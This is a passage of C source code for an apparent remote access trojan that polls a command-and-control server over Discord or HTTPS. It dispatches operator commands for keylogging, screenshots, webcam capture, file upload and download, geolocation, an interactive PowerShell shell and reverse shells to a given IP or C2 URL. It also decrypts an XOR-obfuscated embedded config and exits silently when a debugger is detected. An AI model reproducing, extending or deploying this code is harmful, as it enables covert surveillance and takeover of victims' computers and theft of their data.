    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"No interactive "
                  "shell running\"}}");
  }

  DWORD written;
  char buf[4096];

  // Write user's command on its own line  -- DO NOT chain with CWD tracker.
  // Failing commands (e.g. 'top') corrupt a semicolon-chained tracker.
  snprintf(buf, sizeof(buf), "%s\r\n", input);
  WriteFile(hShellInWrite, buf, strlen(buf), &written, NULL);

  // Let the command produce output before injecting the tracker
  Sleep(400);

  // Write CWD tracker as a completely independent statement
  // 'try' ensures it never fails even if the previous command errored.
  const char *tracker =
      "try { Write-Host \"~~KAAL_CWD~~$((Get-Location).Path)~~END~~\" } "
      "catch "
      "{}\r\n";
  WriteFile(hShellInWrite, tracker, strlen(tracker), &written, NULL);

  // Loop-drain the named pipe for up to ~1.5s so verbose commands
  // (netstat, Get-Process, dir of large folders) are fully captured.
  char output[32768] = {0};
  size_t total_read = 0;
  int empty_rounds = 0;

  for (int round = 0; round < 12; round++) {
    Sleep(125);
    DWORD avail = 0;
    PeekNamedPipe(hShellOutRead, NULL, 0, NULL, &avail, NULL);
    if (avail == 0) {
      if (strstr(output, "~~END~~") != NULL)
        break;
      if (++empty_rounds >= 4)
        break; // 4 × 125ms silence = done
      continue;
    }
    empty_rounds = 0;
    DWORD to_read = avail;
    if (total_read + to_read >= sizeof(output) - 1)
      to_read = (DWORD)(sizeof(output) - 1 - total_read);
    DWORD read_bytes = 0;
    ReadFile(hShellOutRead, output + total_read, to_read, &read_bytes, NULL);
    total_read += read_bytes;
    output[total_read] = '\0';
    if (strstr(output, "~~END~~") != NULL)
      break;
  }

  if (total_read == 0) {
    strcpy(output, "(No output)");
  }

  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "text", json_object_new_string(output));
  char *res = make_result("text", data);
  json_object_put(data);
  return res;
#else
  return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Interactive shell not "
                "supported yet\"}}");
#endif
}

// Command dispatcher
char *execute_command(const char *cmd_json) {
  struct json_object *parsed = json_tokener_parse(cmd_json);
  if (!parsed)
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Invalid JSON\"}}");
  struct json_object *cmd_obj;
  if (!json_object_object_get_ex(parsed, "command", &cmd_obj)) {
    json_object_put(parsed);
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Missing command field\"}}");
  }
  const char *cmd_line = json_object_get_string(cmd_obj);

  struct json_object *task_id_obj;
  const char *task_id_str = "0";
  if (json_object_object_get_ex(parsed, "task_id", &task_id_obj)) {
    task_id_str = json_object_get_string(task_id_obj);
  }
  // Split command into parts
  char cmd_copy[1024];
  strncpy(cmd_copy, cmd_line, sizeof(cmd_copy) - 1);
  char *saveptr;
  char *token = strtok_r(cmd_copy, " ", &saveptr);
  if (!token) {
    json_object_put(parsed);
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Empty command\"}}");
  }
  char *args = saveptr; // rest of string
  char *result = NULL;

  if (args) {
    while (*args == ' ')
      args++;
    if (*args == '\0')
      args = NULL;
  }

  if (strcmp(token, "exec") == 0) {
    if (!args) {
      result = strdup("{\"type\":\"text\",\"data\":{\"text\":\"No command "
                      "provided to exec\"}}");
    } else {
      // Intercept 'ls' and 'cd' underneath 'exec'
      if (strncmp(args, "ls", 2) == 0 && (args[2] == ' ' || args[2] == '\0')) {
        char *path = args + 2;
        while (*path == ' ')
          path++;
        result = cmd_file_list(path);
      } else if (strncmp(args, "cd", 2) == 0 &&
                 (args[2] == ' ' || args[2] == '\0')) {
        char *cd_args = args + 2;
        while (*cd_args == ' ')
          cd_args++;
        result = cmd_cd(cd_args);
      } else {
        result = cmd_shell(args);
      }
    }
  } else if (strcmp(token, "file_list") == 0 || strcmp(token, "ls") == 0) {
    result = cmd_file_list(args ? args : "");
  } else if (strcmp(token, "cd") == 0) {
    result = cmd_cd(args ? args : "");
  } else if (strcmp(token, "delete_file") == 0) {
    result = cmd_file_delete(args ? args : "");
  } else if (strcmp(token, "make_dir") == 0) {
    result = cmd_folder_create(args ? args : "");
  } else if (strcmp(token, "make_file") == 0) {
    result = cmd_file_create(args ? args : "");
  } else if (strcmp(token, "rename_file") == 0) {
    if (args) {
      char *sep = strchr(args, '?');
      if (sep) {
        *sep = '\0';
        result = cmd_file_rename(args, sep + 1);
      } else {
        result =
            strdup("{\"type\":\"error\",\"data\":\"Invalid rename format\"}");
      }
    } else {
      result = strdup("{\"type\":\"error\",\"data\":\"Missing arguments\"}");
    }
  } else if (strcmp(token, "process_list") == 0 || strcmp(token, "ps") == 0) {
    result = cmd_process_list();
  } else if (strcmp(token, "system_info") == 0 ||
             strcmp(token, "sysinfo") == 0) {
    result = cmd_system_info();
  } else if (strcmp(token, "screenshot") == 0) {
    result = cmd_screenshot();
  } else if (strcmp(token, "webcam_snap") == 0 ||
             strcmp(token, "webcam") == 0) {
    result = cmd_webcam_snap();
  } else if (strcmp(token, "keylog_start") == 0) {
    result = cmd_keylog_start();
  } else if (strcmp(token, "keylog_stop") == 0) {
    result = cmd_keylog_stop();
  } else if (strcmp(token, "keylog_dump") == 0) {
    result = cmd_keylog_dump();
  } else if (strcmp(token, "download") == 0) {
    result = cmd_download(args ? args : "", task_id_str);
  } else if (strcmp(token, "upload_chunk") == 0) {
    result = cmd_upload_chunk(args ? args : "{}");
  } else if (strcmp(token, "upload") == 0) {
    // upload expects filename and base64
    char *filename = strtok_r(NULL, " ", &saveptr);
    char *b64data = strtok_r(NULL, "", &saveptr);
    if (filename && b64data) {
      result = cmd_upload(filename, b64data);
    } else {
      result = strdup("{\"type\":\"text\",\"data\":{\"text\":\"Usage: upload "
                      "<filename> <base64>\"}}");
    }
  } else if (strcmp(token, "ping") == 0) {
    result = cmd_ping(args ? args : "8.8.8.8");
  } else if (strcmp(token, "ipconfig") == 0 || strcmp(token, "ifconfig") == 0) {
    result = cmd_ipconfig();
  } else if (strcmp(token, "shell_start") == 0) {
    result = cmd_shell_start();
  } else if (strcmp(token, "shell_stop") == 0) {
    result = cmd_shell_stop();
  } else if (strcmp(token, "shell_input") == 0) {
    result = cmd_shell_input(args ? args : "");
  } else if (strcmp(token, "revshell") == 0) {
#ifdef _WIN32
    // args format: "tcp <ip> <port>"  OR  "https <session_id> <c2_url>"
    if (args) {
      char sub[16] = {0}, p1[256] = {0}, p2[512] = {0};
      sscanf(args, "%15s %255s %511s", sub, p1, p2);
      if (strcmp(sub, "tcp") == 0) {
        int port = atoi(p2);
        result = cmd_revshell_tcp(p1, port > 0 ? port : 4444);
      } else if (strcmp(sub, "https") == 0) {
        // p1 = session_id, p2 = c2_url
#ifdef USE_CURL
        result = cmd_revshell_https(p1, p2);
#else
        result = strdup("{\"type\":\"text\",\"data\":{\"text\":\"HTTPS "
                        "revshell requires cURL build\"}}");
#endif
      } else {
        result = strdup("{\"type\":\"text\",\"data\":{\"text\":\"Usage: "
                        "revshell tcp <ip> "
                        "<port> | revshell https <session_id> <c2_url>\"}}");
      }
    } else {
      result =
          strdup("{\"type\":\"text\",\"data\":{\"text\":\"Usage: revshell tcp "
                 "<ip> <port> | revshell https <session_id> <c2_url>\"}}");
    }
#else
    result = strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"revshell: Windows only\"}}");
#endif
  } else if (strcmp(token, "location") == 0) {
    result = cmd_location();
  } else {
    // If no specific token matches, treat the entire line as a shell command
    // but explicitly intercept un-aliased 'ls' and 'cd' again
    if (strncmp(cmd_line, "ls", 2) == 0 &&
        (cmd_line[2] == ' ' || cmd_line[2] == '\0')) {
      char *path = (char *)cmd_line + 2;
      while (*path == ' ')
        path++;
      result = cmd_file_list(path);
    } else if (strncmp(cmd_line, "cd", 2) == 0 &&
               (cmd_line[2] == ' ' || cmd_line[2] == '\0')) {
      char *cd_args = (char *)cmd_line + 2;
      while (*cd_args == ' ')
        cd_args++;
      result = cmd_cd(cd_args);
    } else {
      result = cmd_shell(cmd_line);
    }
  }

  json_object_put(parsed);
  return result;
}

// ==================== MAIN LOOP ====================
void *heartbeat_thread(void *arg) {
  while (1) {
    sleep(HEARTBEAT_INTERVAL);
    struct json_object *hb = json_object_new_object();
    send_agent_message("heartbeat", 0, hb);
  }
  return NULL;
}

static void decrypt_config() {
  /* Simple XOR decryption using key 0xAA */
  size_t len = strlen(encrypted_agent_config);
  for (size_t i = 0; i < len; i++) {
    agent_config[i] = encrypted_agent_config[i] ^ 0xAA;
  }
  agent_config[len] = '\0';
}

int main() {
  srand((unsigned int)time(NULL));

#ifdef _WIN32
  /* Basic Anti-Debugging Check */
  if (IsDebuggerPresent()) {
    return 0; // Silent exit
  }
#endif

  getcwd(current_dir, sizeof(current_dir));

  /* Decrypt the embedded config */
  decrypt_config();
  uint32_t config_checksum = calculate_config_checksum(agent_config);

  /* Parse config to determine identity and transport */
  struct json_object *cfg = json_tokener_parse(agent_config);
  if (cfg) {
    struct json_object *id_obj, *transport_obj;
    if (json_object_object_get_ex(cfg, "agent_id", &id_obj)) {
      strncpy(agent_id_global, json_object_get_string(id_obj),
              sizeof(agent_id_global) - 1);
    }
    if (json_object_object_get_ex(cfg, "transport", &transport_obj)) {
      strncpy(transport_name_global, json_object_get_string(transport_obj),
              sizeof(transport_name_global) - 1);
    }
    json_object_put(cfg);
  }

  /* Dynamically Hook Transport Plugin */
#ifdef USE_DISCORD
  if (strcmp(transport_name_global, "discord") == 0) {
    active_transport = &transport_discord;
  }
#endif
#ifdef USE_HTTPS
  if (strcmp(transport_name_global, "https") == 0) {
    active_transport = &transport_https;
  }
#endif

  if (!active_transport) {
    return 1;
  }

  /* Initialize Active Transport */
  if (active_transport->init(agent_config) != 0) {
    return 1;
  }

  // Send registration
  struct json_object *reg = json_object_new_object();
  json_object_object_add(reg, "platform",
                         json_object_new_string(
#ifdef _WIN32
                             "windows"
#else
                             "linux"
#endif
                             ));
  json_object_object_add(reg, "hostname",
                         json_object_new_string(agent_id_global));
  json_object_object_add(
      reg, "transport",
      json_object_new_string(
          transport_name_global)); /* Register our active transport path */
  
  char checksum_str[32];
  snprintf(checksum_str, sizeof(checksum_str), "%u", config_checksum);
  json_object_object_add(reg, "integrity_hash", json_object_new_string(checksum_str));

  send_agent_message("register", 0, reg);
#ifdef _WIN32
  Sleep(500);
#else
  usleep(500000);
#endif
  LOG_DIAG("INFO", "Agent initialized and registration sent.");

  // Start heartbeat thread
  pthread_t hb;
  pthread_create(&hb, NULL, heartbeat_thread, NULL);

  // Main command polling loop
  while (1) {
    unsigned char cmd_buf[32768]; // 32KB rx buffer
    size_t cmd_len = sizeof(cmd_buf);

    int recv_status = active_transport->recv(cmd_buf, &cmd_len, 5000);

    if (recv_status == 1 && cmd_len > 0) {
      char *cmd = (char *)cmd_buf;
      if (strlen(cmd) == 0) {
        jitter_sleep();
        continue;
      }
      printf("[>] Received command: %s\n", cmd);
      struct json_object *cmd_obj = json_tokener_parse(cmd);

      if (cmd_obj) {
        struct json_object *type_obj;
        const char *msg_type = "command";
        if (json_object_object_get_ex(cmd_obj, "type", &type_obj)) {
          msg_type = json_object_get_string(type_obj);
        }

        if (strcmp(msg_type, "control") == 0) {
          // Handle global broadcast state awareness
          struct json_object *payload_obj;
          if (json_object_object_get_ex(cmd_obj, "payload", &payload_obj)) {
            struct json_object *state_obj;
            if (json_object_object_get_ex(payload_obj, "state", &state_obj)) {
              const char *state_str = json_object_get_string(state_obj);
              if (strcmp(state_str, "online") == 0) {
                printf("[*] C2 Operator connection ONLINE.\n");
              } else if (strcmp(state_str, "offline") == 0) {
                printf("[*] C2 Operator connection OFFLINE.\n");
              }
            }
          }
          json_object_put(cmd_obj);
          jitter_sleep();
          continue;
        }

        if (strcmp(msg_type, "registered") == 0) {
          // Update agent_id if the server sent a different one (adoption)
          struct json_object *id_obj;
          if (json_object_object_get_ex(cmd_obj, "agent_id", &id_obj)) {
            const char *new_id = json_object_get_string(id_obj);
            if (new_id && strcmp(agent_id_global, new_id) != 0) {
              strncpy(agent_id_global, new_id, sizeof(agent_id_global) - 1);
              LOG_DIAG("INFO", "Adopted server-assigned agent ID");
            }
          }
          json_object_put(cmd_obj);
          jitter_sleep();
          continue;
        }

        // Sequence tracking injection
        struct json_object *seq_obj;
        if (json_object_object_get_ex(cmd_obj, "seq", &seq_obj)) {
          int inc_seq = json_object_get_int(seq_obj);
          if (inc_seq <= seq_in && inc_seq != 0) {
            printf("[-] Duplicate Sequence %d dropped.\n", inc_seq);
            json_object_put(cmd_obj);
            jitter_sleep();
            continue;
          }
          seq_in = inc_seq;
        }

        struct json_object *flags_obj;
        int ack_required = 0;
        if (json_object_object_get_ex(cmd_obj, "flags", &flags_obj)) {
          struct json_object *ack_obj;
          if (json_object_object_get_ex(flags_obj, "ack_required", &ack_obj)) {
            ack_required = json_object_get_boolean(ack_obj);
          }
        }

        struct json_object *payload_obj;
        const char *task_id = "0";
        const char *actual_command = "";

        if (json_object_object_get_ex(cmd_obj, "payload", &payload_obj)) {
          struct json_object *tid_obj, *cmd_str_obj;
          if (json_object_object_get_ex(payload_obj, "task_id", &tid_obj)) {
            task_id = json_object_get_string(tid_obj);
          }
          if (json_object_object_get_ex(payload_obj, "command", &cmd_str_obj)) {
            actual_command = json_object_get_string(cmd_str_obj);
          }
        }

        if (ack_required) {
          struct json_object *ack = json_object_new_object();
          json_object_object_add(ack, "task_id",
                                 json_object_new_string(task_id));
          send_agent_message("ack", 0, ack);
        }

        // The actual_command from V4 protocol is now a stringified JSON
        // object
        const char *final_cmd_to_exec = actual_command;
        struct json_object *parsed_actual_cmd =
            json_tokener_parse(actual_command);
        if (parsed_actual_cmd) {
          struct json_object *cmd_field;
          if (json_object_object_get_ex(parsed_actual_cmd, "command",
                                        &cmd_field)) {
            final_cmd_to_exec = json_object_get_string(cmd_field);
          }
        }

        // Generate legacy wrapper for dispatcher
        struct json_object *temp_cmd = json_object_new_object();
        json_object_object_add(temp_cmd, "command",
                               json_object_new_string(final_cmd_to_exec));
        char *result = execute_command(json_object_to_json_string(temp_cmd));
        json_object_put(temp_cmd);

        if (parsed_actual_cmd) {
          json_object_put(parsed_actual_cmd);
        }

        // Construct outermost C2 protocol payload result message
        struct json_object *out_msg = json_object_new_object();
        json_object_object_add(out_msg, "task_id",
                               json_object_new_string(task_id));

        struct json_object *res_obj = json_tokener_parse(result);
        if (res_obj) {
          json_object_object_add(out_msg, "result", res_obj);
        } else {
          // Fallback wrap for raw text failures
          struct json_object *wrap_raw = json_object_new_object();
          json_object_object_add(wrap_raw, "type",
                                 json_object_new_string("error"));
          struct json_object *text_data = json_object_new_object();
          json_object_object_add(text_data, "text",
                                 json_object_new_string(result));
          json_object_object_add(wrap_raw, "data", text_data);
          json_object_object_add(out_msg, "result", wrap_raw);
        }

        send_agent_message("result", 0, out_msg);
        free(result);

        json_object_put(cmd_obj);
      }
    } else if (recv_status == -1) {
      /* Error or network disconnect, maybe jitter longer */
    }
    jitter_sleep();
  }

  if (active_transport && active_transport->shutdown) {
    active_transport->shutdown();
  }

  return 0;
}
